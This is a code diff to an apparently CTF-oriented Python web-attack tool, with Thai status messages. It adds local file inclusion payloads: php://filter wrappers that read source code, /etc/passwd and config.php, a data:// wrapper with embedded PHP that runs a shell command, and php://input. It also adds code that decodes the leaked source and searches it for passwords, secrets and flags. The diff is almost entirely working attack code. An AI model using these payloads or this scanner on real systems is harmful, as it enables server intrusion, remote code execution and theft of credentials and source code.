@@ -36,6 +36,17 @@ LFI_PAYLOADS = [
     "....//....//....//tmp/flag.txt",
     "../../flag.txt",
     "..%2f..%2f..%2ftmp%2fflag.txt",
+    # PHP stream wrappers: read source code base64-encoded (bypasses
+    # execution) — the single most common PHP LFI escalation in CTFs
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/convert.base64-encode/resource=index",
+    "php://filter/convert.base64-encode/resource=flag",
+    "php://filter/convert.base64-encode/resource=/etc/passwd",
+    "php://filter/read=convert.base64-encode/resource=config.php",
+    "php://filter/zlib.deflate/resource=/etc/passwd",
+    # data / input wrappers (need include(), not just file read)
+    "data://text/plain,<?php system(\"cat /flag*\"); ?>",
+    "php://input",
 ]
 
 SSTI_PAYLOADS = [
@@ -171,6 +182,7 @@ def test_xss(url, param, value):
 
 
 def test_lfi(url, param, value):
+    import base64 as _b64
     flag_hit = None
     for payload in LFI_PAYLOADS:
         r = httpx.get(_build_url(url, param, payload), timeout=6)
@@ -186,6 +198,27 @@ def test_lfi(url, param, value):
             flag_hit = ("LFI", f"อ่าน /etc/passwd ได้! payload: {payload}")
         elif flag_hit is None and "root:" in body and "bin/bash" in body:
             flag_hit = ("LFI", "ได้ /etc/passwd บางส่วน")
+        # php://filter returns base64 source — decode and hunt secrets/flags
+        if payload.startswith("php://filter"):
+            for blob in re.findall(r"[A-Za-z0-9+/=]{40,}", body):
+                try:
+                    src = _b64.b64decode(blob, validate=True).decode(
+                        "utf-8", "replace")
+                except Exception:
+                    continue
+                if "<?php" in src or "PASSWORD" in src.upper():
+                    known2, cands2 = extract_flags(src)
+                    secret_line = next((ln.strip() for ln in src.splitlines()
+                                        if "pass" in ln.lower()
+                                        or "secret" in ln.lower()
+                                        or "flag" in ln.lower()), "")
+                    hit_txt = known2 or cands2 or (
+                        [secret_line] if secret_line else [])
+                    if hit_txt:
+                        flag_hit = flag_hit or (
+                            "LFI-source",
+                            f"php://filter อ่าน source ได้ → {hit_txt}")
+                        break
     return flag_hit
 
 
